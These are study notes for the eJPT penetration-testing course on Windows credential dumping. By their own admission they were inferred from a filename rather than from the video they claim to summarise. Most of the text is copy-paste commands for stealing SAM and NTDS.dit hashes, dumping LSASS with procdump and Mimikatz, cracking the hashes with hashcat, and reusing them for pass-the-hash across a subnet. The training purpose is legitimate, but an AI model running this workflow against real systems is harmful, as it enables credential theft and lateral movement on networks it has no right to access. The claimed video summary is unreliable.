# 01 - Windows Password Hashes (eJPT) — Summary Notes

Note: No transcript was provided. The following is a careful, conservative summary inferred from the filename and module folder (05-WindowsCredentialDumping) and standard eJPT curriculum. Commands and flows are typical and battle-tested for labs.

## What the video covers (Introduction / big picture)
- How Windows stores password hashes:
  - Local accounts: SAM database + SYSTEM hive (bootkey)
  - Domain accounts: NTDS.dit on Domain Controllers
  - Cached domain logons: mscash/mscash2 (DCC/DCC2) in SECURITY hive
- Hash formats and where you’ll see them:
  - LM hash (legacy, often disabled)
  - NT hash (NTLM, MD4 of UTF-16LE password)
  - Output format from common tools: user:RID:LMHASH:NTHASH:::
- Privileges required and safe extraction methods (online vs offline, VSS/shadow copies)
- Typical workflows to dump and use hashes:
  - Local SAM dump and parsing
  - Remote dump with Impacket
  - Domain Controller dump (DRSUAPI replication or offline NTDS)
  - LSASS dump for live creds (related, but not strictly hashes)
- After extraction:
  - Crack hashes (hashcat/john)
  - Use pass-the-hash (PTH) to move laterally without cracking

## Flow (ordered)
1. Identify target scope:
   - Local machine vs Domain Controller
   - Required privileges (local admin/DA)
2. Choose extraction method:
   - Local SAM (reg save + secretsdump)
   - Remote SAM/LSA (secretsdump with creds or hashes)
   - Domain Controller NTDS (DRSUAPI via secretsdump or offline VSS/IFM)
3. Acquire files or run remote dumper:
   - SAM/SYSTEM/SECURITY for local
   - NTDS.dit + SYSTEM for domain (offline), or use -just-dc for replication
4. Parse to obtain hashes:
   - Impacket secretsdump or Mimikatz
5. Use hashes:
   - Crack NTLM with hashcat/john
   - Pass-the-hash with psexec/wmiexec/evil-winrm/crackmapexec
6. Clean up artifacts and confirm access

## Tools highlighted
- Windows built-ins:
  - reg.exe (save SAM/SYSTEM/SECURITY)
  - vssadmin (create shadow copies)
  - ntdsutil (IFM snapshot for NTDS)
  - esentutl (copy locked ESE DBs via VSS)
  - whoami (privileges check)
- Impacket (Python):
  - secretsdump.py (dump SAM/LSA/NTDS hashes)
  - psexec.py, wmiexec.py (remote execution, PTH)
- Sysinternals:
  - procdump.exe (LSASS dump)
- Mimikatz:
  - lsadump::sam, lsadump::lsa
  - sekurlsa::minidump, sekurlsa::logonpasswords
- Post-extraction:
  - hashcat / john (cracking)
  - evil-winrm / crackmapexec (PTH and remote command execution)

## Typical command walkthrough (detailed, copy-paste friendly)

### A) Local machine (Admin) — Dump SAM offline and parse
On the Windows target (elevated cmd/PowerShell):
```
mkdir C:\temp
reg save HKLM\SAM C:\temp\SAM.save
reg save HKLM\SYSTEM C:\temp\SYSTEM.save
reg save HKLM\SECURITY C:\temp\SECURITY.save
```

Exfiltrate SAM.save/SYSTEM.save/SECURITY.save, then on your attacking host (Kali):
```
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```
- Output lines look like: `user:RID:LMHASH:NTHASH:::`
- If SECURITY is unavailable, you can still parse SAM + SYSTEM.

Alternative with Mimikatz (Windows):
```
mimikatz.exe
privilege::debug
lsadump::sam /system:C:\temp\SYSTEM.save /sam:C:\temp\SAM.save
```

### B) Remote machine (Admin creds) — Dump SAM/LSA with Impacket
With cleartext password:
```
secretsdump.py Administrator:'Passw0rd!'@10.10.10.10
```

With NTLM hash (Pass-the-Hash):
```
secretsdump.py -hashes :<NTHASH> Administrator@10.10.10.10
```

Optional flags:
- `-target-ip <IP>` if DNS doesn’t resolve
- `-outputfile dumped_hashes` to save results
- `-use-vss` to rely on shadow copies for locked hives

### C) Domain Controller — Dump NTDS (Domain hashes)

Option 1: DRSUAPI replication via Impacket (requires DA-like privileges):
```
secretsdump.py -just-dc -just-dc-ntlm 'DOMAIN/Administrator:Passw0rd!'@dc01.domain.local
```
- Add `-dc-ip <DC_IP>` if needed.
- `-just-dc-user 'DOMAIN\someuser'` to target a single account.

Option 2: Offline NTDS via VSS or IFM on the DC

Create VSS, copy files, then parse:
```
vssadmin create shadow /for=C:
vssadmin list shadows
:: Find the ShadowCopyVolume path with X number below
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\temp\SYSTEM.save
```

Parse on attacker:
```
secretsdump.py -ntds NTDS.dit -system SYSTEM.save LOCAL
```

IFM (Install From Media) method (on DC):
```
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
```
Then parse:
```
secretsdump.py -ntds "C:\temp\ifm\Active Directory\ntds.dit" -system C:\temp\SYSTEM.save LOCAL
```

### D) LSASS dump (for live creds; related to hashes/pwds)
On the Windows target (requires admin + SeDebugPrivilege):
```
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```
Analyze with Mimikatz:
```
mimikatz.exe
sekurlsa::minidump C:\temp\lsass.dmp
sekurlsa::logonpasswords
```

### E) Crack extracted hashes
Hashcat examples:
- NTLM (mode 1000):
```
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
```
- LM (mode 3000):
```
hashcat -m 3000 -a 0 lmhashes.txt /usr/share/wordlists/rockyou.txt --username
```
- DCC2/mscash2 (mode 2100):
```
hashcat -m 2100 -a 0 mscash2.txt /usr/share/wordlists/rockyou.txt --username
```

John the Ripper (NTLM):
```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### F) Pass-the-Hash (lateral movement without cracking)
Using Impacket:
```
psexec.py -hashes :<NTHASH> DOMAIN/Administrator@10.10.10.20
wmiexec.py -hashes :<NTHASH> DOMAIN/Administrator@10.10.10.20
```

Using Evil-WinRM (PowerShell Remoting):
```
evil-winrm -i 10.10.10.20 -u Administrator -H <NTHASH>
```

Using CrackMapExec:
```
crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTHASH> -x "whoami"
```

## Practical tips
- Run as Administrator. Verify with:
  - `whoami /priv` and `whoami /groups`
- File locations:
  - SAM: C:\Windows\System32\config\SAM
  - SYSTEM: C:\Windows\System32\config\SYSTEM
  - SECURITY: C:\Windows\System32\config\SECURITY
  - NTDS.dit (DC): C:\Windows\NTDS\NTDS.dit
- LM often appears as AAD3B435B51404EEAAD3B435B51404EE (empty LM). Focus on NT hash.
- RID 500 = built-in Administrator. Pay attention to that account’s hash.
- For DCs, prefer DRSUAPI (`-just-dc`) or IFM/VSS offline methods. Directly copying NTDS.dit while online will fail.
- secretsdump output is directly consumable by hashcat/john if you strip username:RIDs/etc as needed; or pass whole lines with `--username` where supported.
- If you already have a TGT, Impacket can use Kerberos: add `-k` (ensure DNS/realm set).
- Clean up artifacts (C:\temp, shadow copies) after testing, if allowed by the lab.
- Some EDRs block LSASS access; procdump and Mimikatz are noisy. The SAM/NTDS workflows via secretsdump are often more reliable in labs.

## Minimal cheat sheet (one-screen flow)
- Local SAM dump:
```
reg save HKLM\SAM C:\temp\SAM.save
reg save HKLM\SYSTEM C:\temp\SYSTEM.save
reg save HKLM\SECURITY C:\temp\SECURITY.save
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```
- Remote SAM/LSA dump:
```
secretsdump.py Administrator:'Passw0rd!'@10.10.10.10
secretsdump.py -hashes :<NTHASH> Administrator@10.10.10.10
```
- Domain (DRSUAPI):
```
secretsdump.py -just-dc -just-dc-ntlm 'DOMAIN/Administrator:Passw0rd!'@dc01
```
- Domain (offline via VSS on DC):
```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\temp\SYSTEM.save
secretsdump.py -ntds NTDS.dit -system SYSTEM.save LOCAL
```
- Crack NTLM:
```
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
```
- Pass-the-Hash:
```
psexec.py -hashes :<NTHASH> DOMAIN/Administrator@10.10.10.20
evil-winrm -i 10.10.10.20 -u Administrator -H <NTHASH>
```

## Summary
- Windows stores local hashes in SAM (encrypted with the SYSTEM bootkey) and domain hashes in NTDS.dit on DCs; cached domain creds reside in SECURITY hive as mscash/mscash2.
- With admin or DA rights you can dump hashes:
  - Local: reg save + secretsdump or Mimikatz
  - Remote: secretsdump with creds or NT hash
  - Domain: secretsdump DRSUAPI or offline NTDS.dit via VSS/IFM
- After extraction, either crack NTLM hashes (hashcat/john) or use pass-the-hash to authenticate without cracking.
- These workflows are core to eJPT Windows credential dumping and lateral movement exercises.